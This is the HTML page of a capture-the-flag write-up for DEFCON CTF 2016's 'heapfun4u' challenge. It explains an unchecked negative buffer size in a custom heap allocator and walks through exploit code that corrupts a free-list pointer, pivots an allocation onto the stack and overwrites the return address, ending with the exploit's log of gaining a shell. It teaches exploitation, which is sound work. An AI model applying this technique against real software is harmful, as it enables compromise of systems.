@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>DEFCON CTF 2016 - heapfun4u</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2016/05/24/defcon-ctf-2016-heapfun4u.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="Info The vulnerable file was given with the following instructions: Guess what, it is a heap bug So yes, we'll be dealing with some heap...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="pwn">
+    <meta name="tags" content="defcon-2016">
+    <meta name="tags" content="x86">
+    <meta name="tags" content="heap">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="DEFCON CTF 2016 - heapfun4u"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="Info The vulnerable file was given with the following instructions: Guess what, it is a heap bug So yes, we'll be dealing with some heap..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2016/05/24/defcon-ctf-2016-heapfun4u.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2016-05-24 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2016-05-24 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="ctf"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="pwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="defcon-2016"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="x86"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="heap"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="DEFCON CTF 2016 - heapfun4u">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2016/05/24/defcon-ctf-2016-heapfun4u.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+      <meta name="twitter:description" content="Info The vulnerable file was given with the following instructions: Guess what, it is a heap bug So yes, we'll be dealing with some heap...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "DEFCON CTF 2016 - heapfun4u",
+  "headline": "DEFCON CTF 2016 - heapfun4u",
+  "datePublished": "2016-05-24 00:00:00-07:00",
+  "dateModified": "2016-05-24 00:00:00-07:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/blog-cover.png",
+  "url": "https://blahcat.github.io/posts/2016/05/24/defcon-ctf-2016-heapfun4u.html",
+  "description": "Info The vulnerable file was given with the following instructions: Guess what, it is a heap bug So yes, we'll be dealing with some heap..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">DEFCON CTF 2016 - heapfun4u</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">24 May 2016</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/blog-cover.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <h3>Info</h3>
+<p>The vulnerable file was given with the following instructions:</p>
+<div class="highlight"><pre><span></span><code>Guess what, it is a heap bug
+</code></pre></div>
+
+<p>So yes, we'll be dealing with some heap fun.</p>
+<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>!file<span class="w"> </span>./heapfun4u
+./heapfun4u:<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,<span class="w"> </span>x86-64,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,<span class="w"> </span>dynamically<span class="w"> </span>linked,<span class="w"> </span>interpreter<span class="w"> </span>/lib64/ld-linux-x86-64.so.2,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">2</span>.6.24,<span class="w"> </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>b019e6cbed93d55ebef500e8c4dec79ce592fa42,<span class="w"> </span>stripped
+gef➤<span class="w">  </span>checksec
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>checksec<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;/home/vagrant/heapfun4u&#39;</span>
+Canary:<span class="w">                                           </span>No
+NX<span class="w"> </span>Support:<span class="w">                                       </span>Yes
+PIE<span class="w"> </span>Support:<span class="w">                                      </span>No
+No<span class="w"> </span>RPATH:<span class="w">                                         </span>Yes
+No<span class="w"> </span>RUNPATH:<span class="w">                                       </span>Yes
+Partial<span class="w"> </span>RelRO:<span class="w">                                    </span>Yes
+Full<span class="w"> </span>RelRO:<span class="w">                                       </span>No
+</code></pre></div>
+
+<p><code>heapfun4u</code> is a tool that manages its own heap allocator to allocate and free
+buffers. On top of those actions, another command allows to write directly into
+one of those buffers. The last command is a helper to leak an address in the
+stack:</p>
+<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>c
+Continuing.
+<span class="o">[</span>A<span class="o">]</span>llocate<span class="w"> </span>Buffer
+<span class="o">[</span>F<span class="o">]</span>ree<span class="w"> </span>Buffer
+<span class="o">[</span>W<span class="o">]</span>rite<span class="w"> </span>Buffer
+<span class="o">[</span>N<span class="o">]</span>ice<span class="w"> </span>guy
+<span class="o">[</span>E<span class="o">]</span>xit
+<span class="p">|</span><span class="w"> </span>N
+Here<span class="w"> </span>you<span class="w"> </span>go:<span class="w"> </span>0x7fffffffe16c
+</code></pre></div>
+
+<h3>Vulnerability</h3>
+<p>Allocating N bytes will:</p>
+<ul>
+<li>lookup in the free list (0x602558) for a free buffer of a bigger size. If
+      not found:</li>
+<li>create a buffer with the following structure:</li>
+</ul>
+<div class="highlight"><pre><span></span><code>struct<span class="w"> </span>__buffer<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>qword<span class="w"> </span>size<span class="p">;</span>
+<span class="w">    </span>void<span class="w"> </span>data<span class="o">[</span>N_rounded_size<span class="o">]</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
+
+<ul>
+<li>add a pointer to <code>struct __buffer-&gt;data</code> in an array at 0x6020A0 (in
+       .bss)</li>
+<li>store the size (N) of this buffer in an array at 0x6023C0</li>
+</ul>
+<p>There are many vulnerabilities in <code>heapfun4u</code> but an interesting one, is the
+fact that when allocating a new buffer, the tool fails to check the size of the
+new buffer to create. This means that we can provide negative-sized buffer:</p>
+<div class="highlight"><pre><span></span><code><span class="o">[</span>A<span class="o">]</span>llocate<span class="w"> </span>Buffer
+<span class="o">[</span>F<span class="o">]</span>ree<span class="w"> </span>Buffer
+<span class="o">[</span>W<span class="o">]</span>rite<span class="w"> </span>Buffer
+<span class="o">[</span>N<span class="o">]</span>ice<span class="w"> </span>guy
+<span class="o">[</span>E<span class="o">]</span>xit
+<span class="p">|</span><span class="w"> </span>A
+Size:<span class="w"> </span>-1
+<span class="o">[</span>A<span class="o">]</span>llocate<span class="w"> </span>Buffer
+<span class="o">[</span>F<span class="o">]</span>ree<span class="w"> </span>Buffer
+<span class="o">[</span>W<span class="o">]</span>rite<span class="w"> </span>Buffer
+<span class="o">[</span>N<span class="o">]</span>ice<span class="w"> </span>guy
+<span class="o">[</span>E<span class="o">]</span>xit
+<span class="p">|</span><span class="w"> </span>W
+<span class="m">1</span><span class="o">)</span><span class="w"> </span>0x7ffff7ff4008<span class="w"> </span>--<span class="w"> </span>-1
+</code></pre></div>
+
+<p>Which we confirm immediately in IDA:</p>
+<div class="highlight"><pre><span></span><code>.text:0000000000400A28<span class="w"> </span>mov<span class="w">     </span>edx,<span class="w"> </span>0FFh<span class="w">       </span><span class="p">;</span><span class="w"> </span>nbytes
+.text:0000000000400A2D<span class="w"> </span>mov<span class="w">     </span>rsi,<span class="w"> </span>rax<span class="w">        </span><span class="p">;</span><span class="w"> </span>buf
+.text:0000000000400A30<span class="w"> </span>mov<span class="w">     </span>edi,<span class="w"> </span><span class="m">0</span><span class="w">          </span><span class="p">;</span><span class="w"> </span>fd
+.text:0000000000400A35<span class="w"> </span>call<span class="w">    </span>_read<span class="w">           </span><span class="p">;;</span><span class="w"> </span>read<span class="o">(</span><span class="m">0</span>,<span class="w"> </span><span class="p">&amp;</span>stdin_buffer,<span class="w"> </span>0xFF<span class="o">)</span>
+
+.text:0000000000400A49<span class="w"> </span>lea<span class="w">     </span>rax,<span class="w"> </span><span class="o">[</span>rbp+stdin_buffer<span class="o">]</span>
+.text:0000000000400A50<span class="w"> </span>mov<span class="w">     </span>rdi,<span class="w"> </span>rax<span class="w">        </span><span class="p">;</span><span class="w"> </span>nptr
+.text:0000000000400A53<span class="w"> </span>call<span class="w">    </span>_atoi
+.text:0000000000400A58<span class="w"> </span>mov<span class="w">     </span><span class="o">[</span>rbp+size<span class="o">]</span>,<span class="w"> </span>eax
+.text:0000000000400A5B<span class="w"> </span>mov<span class="w">     </span>ebx,<span class="w"> </span>cs:index
+.text:0000000000400A61<span class="w"> </span>mov<span class="w">     </span>eax,<span class="w"> </span><span class="o">[</span>rbp+sz<span class="o">]</span>
+.text:0000000000400A64<span class="w"> </span>mov<span class="w">     </span>edi,<span class="w"> </span>eax
+.text:0000000000400A66<span class="w"> </span>call<span class="w">    </span>allocate_buffer<span class="w">  </span><span class="p">;;</span><span class="w"> </span>no<span class="w"> </span>check<span class="w"> </span>on<span class="w"> </span>size<span class="w"> </span>before<span class="w"> </span>call<span class="w"> </span>to<span class="w"> </span>allocate_buffer<span class="o">(</span>size<span class="o">)</span>
+</code></pre></div>
+
+<p>This is an issue because the <code>free_buffer(data_ptr)</code> assumes that it will find the
+length of the chunk at <code>data_ptr - 8</code> and use this location to store a pointer
+to the <code>head_free_list_ptr</code>.  This means that, at the next allocation after the
+<code>free()</code>, this pointer (which we now control) will be dereferenced.</p>
+<h3>Exploitation</h3>
+<h4>Dereferencing an arbitrary location</h4>
+<p>To exploit this, we will use the vulnerability disclosed above to force the heap
+allocator to make an allocation directly inside the stack (whose address is
+known thanks to the "Nice guy" command). So we need to:</p>
+<ol>
+<li>allocate 3 chunks, the second allocated chunk must have a size of -1</li>
+<li>free the 3rd chunk</li>
+<li>free the 2nd chunk.</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="w">          </span><span class="p">|</span><span class="w">  </span><span class="nv">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>N<span class="w">      </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">  </span>data<span class="w">          </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">   </span>..<span class="w">           </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">                </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">                </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">  </span>ptr_to_stack<span class="w">  </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">  </span><span class="nv">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>-1<span class="w">     </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">  </span><span class="nv">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>M<span class="w">      </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">  </span>data<span class="w">          </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">                </span><span class="p">|</span>
+<span class="w">          </span><span class="p">|</span><span class="w">                </span><span class="p">|</span>
+</code></pre></div>
+
+<p>Upon the 2nd free, we will gain control of the <code>head_free_list_ptr</code>:</p>
+<div class="highlight"><pre><span></span><code>  <span class="n">sz</span> <span class="o">=</span> <span class="mi">128</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sz</span><span class="p">)</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+  <span class="n">allocate</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+
+  <span class="n">free</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;3&quot;</span><span class="p">)</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;2&quot;</span><span class="p">)</span>
+
+  <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="n">sz</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4242424242424242</span><span class="p">)</span>
+  <span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+
+<p>The next allocation will attempt to dereference the address 0x4242424242424242
+to see if it's a suitable buffer:</p>
+<div class="highlight"><pre><span></span><code>  <span class="n">allocate</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
+</code></pre></div>
+
+<p>And as expected:</p>
+<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>c
+Continuing.
+
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span>registers<span class="o">]</span>──
+<span class="nv">$rax</span><span class="w">     </span>0x4242424242424242<span class="w"> </span><span class="nv">$rbx</span><span class="w">     </span>0x0000000000000003<span class="w"> </span><span class="nv">$rcx</span><span class="w">     </span>0x00007f580ed92ac0<span class="w"> </span><span class="nv">$rdx</span><span class="w">     </span>0x0000000000000000<span class="w"> </span><span class="nv">$rsp</span><span class="w">     </span>0x00007ffceb5f8a70<span class="w"> </span><span class="nv">$rbp</span><span class="w">     </span>0x00007ffceb5f8ad0
+<span class="nv">$rsi</span><span class="w">     </span>0x00007ffceb5f8ae3<span class="w"> </span><span class="nv">$rdi</span><span class="w">     </span>0x0000000000000200<span class="w"> </span><span class="nv">$rip</span><span class="w">     </span>0x0000000000400d77<span class="w"> </span><span class="nv">$r8</span><span class="w">      </span>0x00007f580efe1500<span class="w"> </span><span class="nv">$r9</span><span class="w">      </span>0x0000000000000200<span class="w"> </span><span class="nv">$r10</span><span class="w">     </span>0x000000000000000a
+<span class="nv">$r11</span><span class="w">     </span>0x1999999999999999<span class="w"> </span><span class="nv">$r12</span><span class="w">     </span>0x00000000004006b0<span class="w"> </span><span class="nv">$r13</span><span class="w">     </span>0x00007ffceb5f8ce0<span class="w"> </span><span class="nv">$r14</span><span class="w">     </span>0x0000000000000000<span class="w"> </span><span class="nv">$r15</span><span class="w">     </span>0x0000000000000000<span class="w"> </span><span class="nv">$cs</span><span class="w">      </span>0x0000000000000033
+<span class="nv">$ss</span><span class="w">      </span>0x000000000000002b<span class="w"> </span><span class="nv">$ds</span><span class="w">      </span>0x0000000000000000<span class="w"> </span><span class="nv">$es</span><span class="w">      </span>0x0000000000000000<span class="w"> </span><span class="nv">$fs</span><span class="w">      </span>0x0000000000000000<span class="w"> </span><span class="nv">$gs</span><span class="w">      </span>0x0000000000000000<span class="w"> </span><span class="nv">$eflags</span><span class="w">  </span><span class="o">[</span><span class="w"> </span>PF<span class="w"> </span>IF<span class="w"> </span>RF<span class="w"> </span><span class="o">]</span>
+Flags:<span class="w"> </span><span class="o">[</span><span class="w"> </span>carry<span class="w">  </span>PARITY<span class="w">  </span>adjust<span class="w">  </span>zero<span class="w">  </span>sign<span class="w">  </span><span class="nb">trap</span><span class="w">  </span>INTERRUPT<span class="w">  </span>direction<span class="w">  </span>overflow<span class="w">  </span>RESUME<span class="w">  </span>virtualx86<span class="w">  </span>identification<span class="w"> </span><span class="o">]</span>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span>stack<span class="o">]</span>──
+0x00007ffceb5f8a70│+0x00:<span class="w"> </span>-0x1<span class="w">      </span>←<span class="w"> </span><span class="nv">$sp</span>
+0x00007ffceb5f8a78│+0x08:<span class="w"> </span>0x2000efe1740
+0x00007ffceb5f8a80│+0x10:<span class="w"> </span>0x00007f580ed92a35<span class="w"> </span>→<span class="w"> </span>0x0
+0x00007ffceb5f8a88│+0x18:<span class="w"> </span>0x00007ffceb5f8ae0<span class="w"> </span>→<span class="w"> </span><span class="s2">&quot;512[...]&quot;</span>
+0x00007ffceb5f8a90│+0x20:<span class="w"> </span>0x00007ffceb5f8ce0<span class="w"> </span>→<span class="w"> </span>0x1
+0x00007ffceb5f8a98│+0x28:<span class="w"> </span>0x2
+0x00007ffceb5f8aa0│+0x30:<span class="w"> </span>0x4242424242424242
+0x00007ffceb5f8aa8│+0x38:<span class="w"> </span>0x00000000004006b0<span class="w"> </span>→<span class="w"> </span>xor<span class="w"> </span>ebp,ebp
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span>code:i386:x86-64<span class="o">]</span>──
+0x400d67<span class="w">     </span>mov<span class="w">    </span>QWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>rbp-0x8<span class="o">]</span>,rax
+0x400d6b<span class="w">     </span>mov<span class="w">    </span>rax,QWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>rbp-0x8<span class="o">]</span>
+0x400d6f<span class="w">     </span>mov<span class="w">    </span>QWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>rbp-0x30<span class="o">]</span>,rax
+0x400d73<span class="w">     </span>mov<span class="w">    </span>rax,QWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>rbp-0x8<span class="o">]</span>
+0x400d77<span class="w">     </span>mov<span class="w">    </span>rax,QWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span><span class="w">          </span>←<span class="w"> </span><span class="nv">$pc</span>
+0x400d7a<span class="w">     </span>and<span class="w">    </span>rax,0xfffffffffffffffc
+0x400d7e<span class="w">     </span>lea<span class="w">    </span>rdx,<span class="o">[</span>rax-0x8<span class="o">]</span>
+0x400d82<span class="w">     </span>mov<span class="w">    </span>rax,QWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>rbp-0x8<span class="o">]</span>
+<span class="o">[</span>...<span class="o">]</span>
+</code></pre></div>
+
+<p>We now need to create a good setup in the stack to have <code>heapfun4u</code> believe its
+a valid region for allocation.</p>
+<h4>Pivoting to stack</h4>
+<p>To pivot to the stack, we first needed to know exactly the exactly of $rbp when
+the last call to <code>allocate_buffer()</code> is made. Luckily, as said early, the
+command "Nice guy" will provide use with such information.</p>
+<p>The stack layout is hard to fully control at the level of the
+<code>allocate_buffer()</code> function. However, this function is called by the <code>main()</code>
+function, which uses a very large buffer (0x100 bytes) to store values read from stdin:</p>
+<div class="highlight"><pre><span></span><code>.text:0000000000400905 ; int __cdecl main(int, char **, char **)
+.text:0000000000400905 main proc near
+.text:0000000000400905
+.text:0000000000400905 stdin_buffer= byte ptr -120h    ;; &lt;&lt;-- this buffer provides a good place to land reliably
+.text:0000000000400905 sz= dword ptr -14h
+</code></pre></div>
+
+<p>Additionally, its location is very easy to pinpoint:</p>
+<div class="highlight"><pre><span></span><code>               |       |    RetAddr       |
+context of     |       |   SFP of main    |
+main()         |       |     size         |
+               |       |  buffer[0x100]   |
+               |       |                  |                                 |
+               |       |                  |                                 |
+               |       |                  |                                 |
+               |       |                  |                                 |
+               V       |                  |                                 |
+               |       |    RetAddr       |                                 |
+               |       |      SFP         |                                 |
+               |       |                  |          to the stack of main() V
+allocate()     |       |                  |
+               |       |                  |
+               |       |                  |
+               |       |                  |
+               |       |                  |
+               |       |                  |
+</code></pre></div>
+
+<p>So now, we can point <code>head_free_list_ptr</code> to a location we fully control. All we
+need to write at this address a large value, for example 0x1000 so that when
+inspecting this address, <code>allocate_buffer()</code> will believe the buffer in the stack
+is large enough for the new allocation:</p>
+<div class="highlight"><pre><span></span><code><span class="n">padd</span> <span class="o">=</span> <span class="s1">&#39;D&#39;</span><span class="o">*</span><span class="mi">126</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">free</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;2&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">padd</span><span class="p">)</span>
+
+<span class="n">allocate</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">512</span><span class="p">)</span>
+</code></pre></div>
+
+<p>We have now an allocation in stack:</p>
+<div class="highlight"><pre><span></span><code><span class="o">[</span>A<span class="o">]</span>llocate<span class="w"> </span>Buffer
+<span class="o">[</span>F<span class="o">]</span>ree<span class="w"> </span>Buffer
+<span class="o">[</span>W<span class="o">]</span>rite<span class="w"> </span>Buffer
+<span class="o">[</span>N<span class="o">]</span>ice<span class="w"> </span>guy
+<span class="o">[</span>E<span class="o">]</span>xit
+<span class="p">|</span><span class="w"> </span>W
+<span class="m">1</span><span class="o">)</span><span class="w"> </span>0x7f06cd628008<span class="w"> </span>--<span class="w"> </span><span class="m">128</span>
+<span class="m">2</span><span class="o">)</span><span class="w"> </span>0x7f06cd628090<span class="w"> </span>--<span class="w"> </span>-1
+<span class="m">3</span><span class="o">)</span><span class="w"> </span>0x7f06cd628098<span class="w"> </span>--<span class="w"> </span><span class="m">10</span>
+<span class="m">4</span><span class="o">)</span><span class="w"> </span>0x7fffffffe458<span class="w"> </span>--<span class="w"> </span><span class="m">512</span>
+^C
+gef➤<span class="w">  </span>xinfo<span class="w"> </span>0x00007fffffffe458
+────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>xinfo:<span class="w"> </span>0x7fffffffe458<span class="w"> </span><span class="o">]</span>──────────────────────────────────────
+Found<span class="w"> </span>0x00007fffffffe458
+Page:<span class="w"> </span>0x00007ffffffde000<span class="w"> </span>→<span class="w"> </span>0x00007ffffffff000<span class="w"> </span><span class="o">(</span><span class="nv">size</span><span class="o">=</span>0x21000<span class="o">)</span>
+Permissions:<span class="w"> </span>rw-
+Pathname:<span class="w"> </span><span class="o">[</span>stack<span class="o">]</span>
+Offset<span class="w"> </span><span class="o">(</span>from<span class="w"> </span>page<span class="o">)</span>:<span class="w"> </span>+0x20458
+Inode:<span class="w"> </span><span class="m">0</span>
+</code></pre></div>
+
+<p>This means that we have transformed it into a regular stack overflow, simply by
+writing at the newly allocated address 0x7fffffffe458. Since, when allocating a
+new buffer, <code>heapfun4u</code> calls <code>mmap()</code> with Read|Write|Execute, we have plenty
+to location to drop our shellcode and jump to it.</p>
+<p>This completes our execution steps.</p>
+<h4>Pwn !</h4>
+<p>Run the
+<a href="https://gist.github.com/hugsy/892495d2299189db06517ff9a0b6249b">exploit code</a>:</p>
+<div class="highlight"><pre><span></span><code>~/cur/heapfun4u<span class="w"> </span>$<span class="w"> </span>./heapfun4u.py
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span><span class="m">172</span>.28.128.4:3957
+Attach<span class="w"> </span>with<span class="w"> </span>GDB<span class="w"> </span>and<span class="w"> </span>hit<span class="w"> </span>Enter
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">rbp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x7ffc8c5d7ca0
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">rsp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x7ffc8c5d7c40
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>1st<span class="w"> </span>allocation<span class="w"> </span>ok
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>2nd<span class="w"> </span>allocation<span class="w"> </span>ok
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>3rd<span class="w"> </span>allocation<span class="w"> </span>ok
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Leaked<span class="w"> </span>mmap-ed<span class="w"> </span>areas:<span class="w"> </span>0x7f9c522fd008
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Free<span class="o">(</span><span class="c1">#3) ok</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Free<span class="o">(</span><span class="c1">#2) ok</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Overwriting<span class="w"> </span>pointer<span class="w"> </span>ok
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Stack<span class="w"> </span>pivot<span class="w"> </span>ok
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Overwriting<span class="w"> </span>rip<span class="w"> </span>ok
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Trigger<span class="w"> </span><span class="k">return</span><span class="w"> </span>to<span class="w"> </span>7f9c522fd008
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive...
+
+To<span class="w"> </span>run<span class="w"> </span>a<span class="w"> </span><span class="nb">command</span><span class="w"> </span>as<span class="w"> </span>administrator<span class="w"> </span><span class="o">(</span>user<span class="w"> </span><span class="s2">&quot;root&quot;</span><span class="o">)</span>,<span class="w"> </span>use<span class="w"> </span><span class="s2">&quot;sudo &lt;command&gt;&quot;</span>.
